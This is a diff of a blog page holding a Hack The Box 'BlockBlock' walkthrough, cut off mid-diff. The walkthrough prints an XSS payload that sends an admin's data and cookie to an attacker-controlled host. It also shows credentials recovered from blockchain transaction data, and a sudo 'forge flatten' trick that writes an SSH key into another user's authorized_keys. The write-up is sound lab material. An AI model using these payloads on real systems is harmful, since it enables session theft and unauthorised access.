@@ -12,7 +12,7 @@
   <meta name="title" content="BlockBlock Walkthrough(Hack The Box) &middot; Secure The Throne" />
   
   <meta name="description" content="Awesome Walkthrough" />
-  <meta name="keywords" content="Hard, Linux, Hack The Box, hacking, Web3, BLock Chain, Walkthrough, " />
+  <meta name="keywords" content="Hard, Linux, Hack The Box, hacking, Web3, Block Chain, Walkthrough, " />
   
   
   <link rel="canonical" href="http://localhost:1313/posts/1743038151313-blockblock-walkthroughhack-the-box/" />
@@ -76,14 +76,14 @@
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-03-27T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-27T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-03-28T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-28T00:00:00+00:00">
     <meta property="article:tag" content="Hard">
     <meta property="article:tag" content="Linux">
     <meta property="article:tag" content="Hack the Box">
     <meta property="article:tag" content="Hacking">
     <meta property="article:tag" content="Web3">
-    <meta property="article:tag" content="BLock Chain">
+    <meta property="article:tag" content="Block Chain">
     <meta property="og:image" content="http://localhost:1313/posts/1743038151313-blockblock-walkthroughhack-the-box/featured.png">
 
   
@@ -109,15 +109,15 @@
       "name": "Emp5r0R"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-03-27T00:00:00\u002b00:00",
-    "datePublished": "2025-03-27T00:00:00\u002b00:00",
+    "dateCreated": "2025-03-28T00:00:00\u002b00:00",
+    "datePublished": "2025-03-28T00:00:00\u002b00:00",
     
-    "dateModified": "2025-03-27T00:00:00\u002b00:00",
+    "dateModified": "2025-03-28T00:00:00\u002b00:00",
     
-    "keywords": ["Hard","Linux","Hack The Box","hacking","Web3","BLock Chain","Walkthrough"],
+    "keywords": ["Hard","Linux","Hack The Box","hacking","Web3","Block Chain","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "816"
+    "wordCount": "1252"
   }]
   </script>
 
@@ -155,6 +155,9 @@
 
 
 
+
+
+<script defer src="/lib/typeit/typeit.umd.57f9bc6e047efc875cb4f2e9ca74c802de33638d2c3aff6d9b7eb3c7588c24649b6c3e51cd45f49c0ed0cf72aedbd694bf2d35f358a34076d63f9febabc0bd6f.js" integrity="sha512-V/m8bgR&#43;/IdctPLpynTIAt4zY40sOv9tm36zx1iMJGSbbD5RzUX0nA7Qz3Ku29aUvy0181ijQHbWP5/rq8C9bw=="></script>
 
 
 
@@ -678,7 +681,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-03-27T00:00:00&#43;00:00">27 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>816 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-03-28T00:00:00&#43;00:00">28 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1252 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -780,7 +783,7 @@
   <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/block-chain/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    BLock Chain
+    Block Chain
   </span>
 </span>
   </span>
@@ -956,7 +959,20 @@
     <li><a href="#reconnaissance">Reconnaissance</a></li>
     <li><a href="#enumeration">Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#pivoting">Pivoting</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#step-1">Step-1</a></li>
+            <li><a href="#step-2">Step-2</a></li>
+            <li><a href="#step-3">Step-3</a></li>
+            <li><a href="#step-4">Step-4</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
   </ul>
 </nav>
   </div>
@@ -973,7 +989,20 @@
     <li><a href="#reconnaissance">Reconnaissance</a></li>
     <li><a href="#enumeration">Enumeration</a></li>
     <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#pivoting">Pivoting</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#step-1">Step-1</a></li>
+            <li><a href="#step-2">Step-2</a></li>
+            <li><a href="#step-3">Step-3</a></li>
+            <li><a href="#step-4">Step-4</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
   </ul>
 </nav>
   </div>
@@ -1068,37 +1097,37 @@
     
 </h2>
 <ul>
-<li>Got two ports open 80 and ssh</li>
-<li>First impression of the web is, It is a Web3 and a chat app
+<li>On scanning with Nmap, it found two ports open 80 and 22-ssh</li>
+<li>First impression of the web is, It is a Web3 and a chat app. As soon as I open It I could see it.
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106030842.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106030842.png?raw=true" alt="Pasted image 20250106030842.png" />
+    
+  </figure>
 </li>
-<li>The page using Ethereum
+<li>I can easily get that this page is using Ethereum
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250105224629.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250105224629.png?raw=true" alt="Pasted image 20250105224629.png" />
+    
+  </figure>
 </li>
-<li>Interesting isn&rsquo;t it, Created a account and logged in</li>
-<li>Has a secure and cool place to chat
+<li>Interesting isn&rsquo;t it, So I Created an account and logged in</li>
+<li>Has a secure and cool interface to chat
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106000441.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106000441.png?raw=true" alt="Pasted image 20250106000441.png" />
+    
+  </figure>
 </li>
 <li>The chats data are stored using Ethereum in Blocks</li>
 <li>Scooped around a little bit and found <code>/admin</code> page but with no access for us</li>
-<li>The &ldquo;Report User&rdquo; button seems little suspicious cause the website is well built but not the report button
+<li>The &ldquo;Report User&rdquo; button seems to be little suspicious cause the website is well built but not the report button, It has traditional alert pop up.
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106000810.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106000810.png?raw=true" alt="Pasted image 20250106000810.png" />
+    
+  </figure>
 </li>
 </ul>
 
@@ -1115,47 +1144,52 @@
 </h2>
 <ul>
 <li>Turns out the <code>Report User</code> button functionality is vulnerable to XSS</li>
-<li>The stupid admin is clicking around the links.</li>
-<li>But the weird thing here is, Admin only clicking alert boxes not all links</li>
-<li>So made up a XSS payload with the help of chatGPT</li>
+<li>The stupid admin is clicking around the links.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/rVc6tckXu3uF0eMOh1/giphy.gif?cid=790b7611jjcpkblh86k7fg377z1hb32pub6ivil3ufcflldq&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" alt="clicking" />
+    
+  </figure>
+</li>
+<li>But the weird thing here is, Admin is only clicking from alert boxes not just the simple URL/links</li>
+<li>So I made a XSS payload with the help of chatGPT to exfiltrate some data</li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="s2">&#34;fetch(&#39;http://10.10.11.43/api/info&#39;).then(response =&gt; {return response.text();}).then(dataFromA =&gt; {return fetch(`http://10.10.14.12:8000/?d=${dataFromA}`)})&#34;</span><span class="o">&gt;</span>
 </span></span></code></pre></div><ul>
-<li>This payload fetches data from the request to the <code>/api/info</code> and returns it to my server
+<li>This payload fetches data from <code>/api/info</code> and then returns it to my server. This is simple yet effective payload.
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106001445.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106001445.png?raw=true" alt="Pasted image 20250106001445.png" />
+    
+  </figure>
 </li>
-<li>Got the admin cookie and accessed the <code>/admin</code> page.</li>
-<li>In the Source of admin page found interesting endpoints
+<li>Got the admin cookie and tried to access the <code>/admin</code> page.</li>
+<li>In the Source of admin page, found some interesting endpoints
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106001604.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106001604.png?raw=true" alt="Pasted image 20250106001604.png" />
+    
+  </figure>
 </li>
-<li>This <code>json-rpc</code> endpoint can query more stuff</li>
+<li>This <code>json-rpc</code> endpoint can query more, like hashes and stuff</li>
 <li>This <a href="https://ethereum.org/en/developers/docs/apis/json-rpc/" target="_blank">Documentation</a> has more info about the stuffs that can be done with this endpoint</li>
 <li>But particularly this one catches my attention
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106002345.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106002345.png?raw=true" alt="Pasted image 20250106002345.png" />
+    
+  </figure>
 </li>
 <li>This parameter <code>eth_blockNumber</code> gets the recent block that saved have been saved.</li>
 <li>I tested the endpoint <code>json-rpc</code> with this <code>eth_blockNumber</code></li>
-<li>Seems the value next to the <code>params</code> value is a boolean
+<li>Seems like the value next to the <code>params</code> value is a boolean
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106002939.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106002939.png?raw=true" alt="Pasted image 20250106002939.png" />
+    
+  </figure>
 </li>
-<li>The <code>Params</code> value is the the value for the block.</li>
-<li>This request data&rsquo;s response seemed interesting</li>
+<li>The <code>Params</code> value is the the value for the block the request data from it seemed interesting</li>
 <li><strong>Request</strong></li>
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;jsonrpc&#34;</span><span class="p">:</span><span class="s2">&#34;2.0&#34;</span><span class="p">,</span><span class="nt">&#34;method&#34;</span><span class="p">:</span><span class="s2">&#34;eth_getBlockByNumber&#34;</span><span class="p">,</span><span class="nt">&#34;params&#34;</span><span class="p">:[</span><span class="s2">&#34;0x3&#34;</span><span class="p">,</span><span class="kc">true</span><span class="p">],</span><span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span>
@@ -1164,8 +1198,7 @@
 </ul>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;jsonrpc&#34;</span><span class="p">:</span><span class="s2">&#34;2.0&#34;</span><span class="p">,</span><span class="nt">&#34;result&#34;</span><span class="p">:{</span><span class="nt">&#34;baseFeePerGas&#34;</span><span class="p">:</span><span class="s2">&#34;0x2ed9c9d5&#34;</span><span class="p">,</span><span class="nt">&#34;blobGasUsed&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">,</span><span class="nt">&#34;difficulty&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">,</span><span class="nt">&#34;excessBlobGas&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">,</span><span class="nt">&#34;extraData&#34;</span><span class="p">:</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span><span class="nt">&#34;gasLimit&#34;</span><span class="p">:</span><span class="s2">&#34;0x1c9c380&#34;</span><span class="p">,</span><span class="nt">&#34;gasUsed&#34;</span><span class="p">:</span><span class="s2">&#34;0x5208&#34;</span><span class="p">,</span><span class="nt">&#34;hash&#34;</span><span class="p">:</span><span class="s2">&#34;0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2&#34;</span><span class="p">,</span><span class="nt">&#34;logsBloom&#34;</span><span class="p">:</span><span class="s2">&#34;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#34;</span><span class="p">,</span><span class="nt">&#34;miner&#34;</span><span class="p">:</span><span class="s2">&#34;0x0000000000000000000000000000000000000000&#34;</span><span class="p">,</span><span class="nt">&#34;mixHash&#34;</span><span class="p">:</span><span class="s2">&#34;0x0000000000000000000000000000000000000000000000000000000000000000&#34;</span><span class="p">,</span><span class="nt">&#34;nonce&#34;</span><span class="p">:</span><span class="s2">&#34;0x0000000000000000&#34;</span><span class="p">,</span><span class="nt">&#34;number&#34;</span><span class="p">:</span><span class="s2">&#34;0x3&#34;</span><span class="p">,</span><span class="nt">&#34;parentHash&#34;</span><span class="p">:</span><span class="s2">&#34;0xbb0a3238a043aca148c25eca9495f869c9d77eb4e09aa10d84c7671bf4c3bed1&#34;</span><span class="p">,</span><span class="nt">&#34;receiptsRoot&#34;</span><span class="p">:</span><span class="s2">&#34;0x1ee3363046236ead36f002663ef78ab52f67ac34d6f1f88e10d3880f599467fe&#34;</span><span class="p">,</span><span class="nt">&#34;sha3Uncles&#34;</span><span class="p">:</span><span class="s2">&#34;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347&#34;</span><span class="p">,</span><span class="nt">&#34;size&#34;</span><span class="p">:</span><span class="s2">&#34;0x27a&#34;</span><span class="p">,</span><span class="nt">&#34;stateRoot&#34;</span><span class="p">:</span><span class="s2">&#34;0xbfe4686238e176ede330654210feb1bb7498d93bb02d29f260f8f196a96a606e&#34;</span><span class="p">,</span><span class="nt">&#34;timestamp&#34;</span><span class="p">:</span><span class="s2">&#34;0x677ac8f9&#34;</span><span class="p">,</span><span class="nt">&#34;totalDifficulty&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">,</span><span class="nt">&#34;transactions&#34;</span><span class="p">:[{</span><span class="nt">&#34;accessList&#34;</span><span class="p">:[],</span><span class="nt">&#34;blockHash&#34;</span><span class="p">:</span><span class="s2">&#34;0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2&#34;</span><span class="p">,</span><span class="nt">&#34;blockNumber&#34;</span><span class="p">:</span><span class="s2">&#34;0x3&#34;</span><span class="p">,</span><span class="nt">&#34;chainId&#34;</span><span class="p">:</span><span class="s2">&#34;0x7a69&#34;</span><span class="p">,</span><span class="nt">&#34;from&#34;</span><span class="p">:</span><span class="s2">&#34;0xb795dc8a5674250b602418e7f804cd162f03338b&#34;</span><span class="p">,</span><span class="nt">&#34;gas&#34;</span><span class="p">:</span><span class="s2">&#34;0x5209&#34;</span><span class="p">,</span><span class="nt">&#34;gasPrice&#34;</span><span class="p">:</span><span class="s2">&#34;0x2ed9c9d5&#34;</span><span class="p">,</span><span class="nt">&#34;hash&#34;</span><span class="p">:</span><span class="s2">&#34;0xeebe19598f35ccc154e96861f410a90f6a76ab9aeec456a880e6cb8b571faf62&#34;</span><span class="p">,</span><span class="nt">&#34;input&#34;</span><span class="p">:</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span><span class="nt">&#34;maxFeePerGas&#34;</span><span class="p">:</span><span class="s2">&#34;0x5db393aa&#34;</span><span class="p">,</span><span class="nt">&#34;maxPriorityFeePerGas&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">,</span><span class="nt">&#34;nonce&#34;</span><span class="p">:</span><span class="s2">&#34;0x2&#34;</span><span class="p">,</span><span class="nt">&#34;r&#34;</span><span class="p">:</span><span class="s2">&#34;0xa1573f48dd6f63e72b9ce8c6227179a139d59870f4d16e874e88d4b93cba095c&#34;</span><span class="p">,</span><span class="nt">&#34;s&#34;</span><span class="p">:</span><span class="s2">&#34;0x79d8d9216eceefec581ef607b2aa74211ce4bdb66171882834b5ab8d117b53d6&#34;</span><span class="p">,</span><span class="nt">&#34;to&#34;</span><span class="p">:</span><span class="s2">&#34;0x6b388912df3e0c179384903efa36daf47738ec91&#34;</span><span class="p">,</span><span class="nt">&#34;transactionIndex&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;0x2&#34;</span><span class="p">,</span><span class="nt">&#34;v&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">,</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;0x2540be400&#34;</span><span class="p">,</span><span class="nt">&#34;yParity&#34;</span><span class="p">:</span><span class="s2">&#34;0x0&#34;</span><span class="p">}],</span><span class="nt">&#34;transactionsRoot&#34;</span><span class="p">:</span><span class="s2">&#34;0x231277c116523613e92267b48237bd95ea4da316b3b07fa1bb3ad86de49caf78&#34;</span><span class="p">,</span><span class="nt">&#34;uncles&#34;</span><span class="p">:[]}}</span>
 </span></span></code></pre></div><ul>
-<li>But this response didn&rsquo;t had value for <code>input</code>.</li>
-<li><code>input</code> should be the data which is written in the block</li>
+<li>But this response is literally a blob of text with multiple values init which mean nothing to us.</li>
 </ul>
 
 
@@ -1180,30 +1213,176 @@
     
 </h2>
 <ul>
-<li>By Changing the value of <code>i</code> here like <code>1,2 or 3</code>, we can explore other block&rsquo;s data</li>
+<li>As this a array, down here by changing the value of <code>i</code> like <code>1,2 or 3</code>, we can explore other blocks data</li>
 </ul>
-<pre tabindex="0"><code>&#34;params&#34;:[&#34;0xi&#34;,true]
-</code></pre><ul>
-<li>Likewise got a <code>input</code> value
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s2">&#34;params&#34;</span>:<span class="o">[</span><span class="s2">&#34;0xi&#34;</span>,true<span class="o">]</span>
+</span></span></code></pre></div><ul>
+<li>Likewise got a <code>input</code> value on the response from my request. Which is different from my previous requests
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106003937.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106003937.png?raw=true" alt="Pasted image 20250106003937.png" />
+    
+  </figure>
 </li>
-<li>After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it using with the help of Cyberchef and got password and username from it.
+<li>After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it with the help of Cyberchef and got a password and username from it.
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106004230.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106004230.png?raw=true" alt="Pasted image 20250106004230.png" />
+    
+  </figure>
 </li>
-<li>So logged in using SSH and got the user flag
+</ul>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/7BCoU3NNe1hwHZb1o9/giphy.gif?cid=790b7611xtx75fmm7kdpd7dldwkz44dwoq3rpzy05nls9fef&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" alt="hidden" />
+    
+  </figure>
+</p>
+<ul>
+<li>Logged in using SSH and got the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>User flag</span>
+  </span>
+</span>
+</div>
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106004313.png" />
-      
-    </figure>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250106004313.png?raw=true" alt="Pasted image 20250106004313.png" />
+    
+  </figure>
+</li>
+</ul>
+
+
+<h2 class="relative group">Pivoting 
+    <div id="pivoting" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#pivoting" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>User <code>keira</code> can sudo as user <code>paul</code> on a binary called <code>forge</code>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107181255.png?raw=true" alt="Pasted image 20250106004658.png" />
+    
+  </figure>
+</li>
+<li><code>forge</code> is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like <code>Foundry</code> for Ethereum development and that&rsquo;s my speculation at first or any it could be someother CLI-based tool with the name <code>forge</code></li>
+<li>After hours of research I found that I can use <code>flatten</code> option in forge to write on any file.</li>
+<li>When someone login in using SSH by a private key, SSH checks the authenticity of the key with its public key on the system.</li>
+<li>Here using the <code>flatten</code> option in forge, I can simply write the Public key of the user <code>keira</code> to the user <code>paul</code>&rsquo;s public key in his home directory. After that on passing the private key of the user <code>keira</code> I can get ssh shell as user <code>paul</code></li>
+</ul>
+
+
+<h4 class="relative group">Step-1 
+    <div id="step-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#step-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<pre><code>- On the system created ssh keys using this command
+</code></pre>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107181255.png?raw=true" alt="Pasted image 20250107181255.png" />
+    
+  </figure>
+</p>
+
+
+<h4 class="relative group">Step-2 
+    <div id="step-2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#step-2" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>Copy the public key of user <code>keira</code> to the <code>/tmp</code> folder and Give all necessary permissions.</li>
+</ul>
+<pre tabindex="0"><code>cp .ssh/id_ed25519.pub /tmp/pub
+</code></pre><pre tabindex="0"><code>chmod 644 /tmp/pub
+</code></pre><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183317.png?raw=true" alt="Pasted image 20250107183317.png" />
+    
+  </figure>
+</p>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/PhVWidvw9k4AAAAC/normal-doggo.gif" alt="nothing" />
+    
+  </figure>
+</p>
+
+
+<h4 class="relative group">Step-3 
+    <div id="step-3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#step-3" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>Exploit it using the <code>flatten</code> option to write the public key to the user <code>paul</code>&rsquo;s home directory in this <code>.ssh/authorized_keys</code> file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183403.png?raw=true" alt="Pasted image 20250107183403.png" />
+    
+  </figure>
+</p>
+
+
+<h4 class="relative group">Step-4 
+    <div id="step-4" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#step-4" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>Now share the private key to the attacker&rsquo;s system and login using the private key as user <code>paul</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server --directory .ssh/
+</span></span></code></pre></div><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183432.png?raw=true" alt="Pasted image 20250107183432.png" />
+    
+  </figure>
+</p>
+<ul>
+<li>Got access as user <code>paul</code>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250107183526.png?raw=true" alt="Pasted image 20250107183526.png" />
+    
+  </figure>
 </li>
 </ul>
 
@@ -1219,80 +1398,11 @@
     
 </h2>
 <ul>
-<li>It seems the user keira can run sudo a user paul with a binary
-
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250106004658.png" />
-      
-    </figure>
-</li>
-<li><code>forge</code> is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like <code>Foundry</code> for Ethereum development or any other CLI-based tool with the name <code>forge</code></li>
-<li>After hours of research found that we can use <code>flatten</code> option using forge to write something .</li>
-<li>When someone login in SSH using private key, SSH checks the authenticity of the key with its public key on the system.</li>
-<li>Here using the <code>flatten</code> option in forge, can simply copy the Public key of the user <code>keira</code> to home directory of <code>paul</code>. After that on passing the private key of the user <code>keira</code> we can get ssh shell as <code>paul</code></li>
-<li><strong>Step-1</strong>
-<ul>
-<li>On the system created ssh keys using this command</li>
-</ul>
-</li>
-</ul>
-<pre tabindex="0"><code>ssh-keygen
-</code></pre><p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107181255.png" />
-      
-    </figure>
-</p>
-<ul>
-<li><strong>Step-2</strong>
-<ul>
-<li>Copy the public key of user <code>keira</code> to the <code>/tmp</code> folder and Give all necessary permissions.</li>
-</ul>
-</li>
-</ul>
-<pre tabindex="0"><code>cp .ssh/id_ed25519.pub /tmp/pub
-</code></pre><pre tabindex="0"><code>chmod 644 /tmp/pub
-</code></pre><p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183317.png" />
-      
-    </figure>
-</p>
-<ul>
-<li><strong>Step-3</strong></li>
-<li>Exploit using the <code>flatten</code> option to write the public to the user <code>paul</code>&rsquo;s home directory in the <code>.ssh/authorized_keys</code> file</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys
-</span></span></code></pre></div><p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183403.png" />
-      
-    </figure>
-</p>
-<ul>
-<li><strong>Step-4</strong></li>
-<li>Now share the private key to the host system and login using the private key as user <code>paul</code></li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server --directory .ssh/
-</span></span></code></pre></div><p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="" alt="Pasted image 20250107183432.png" />
-      
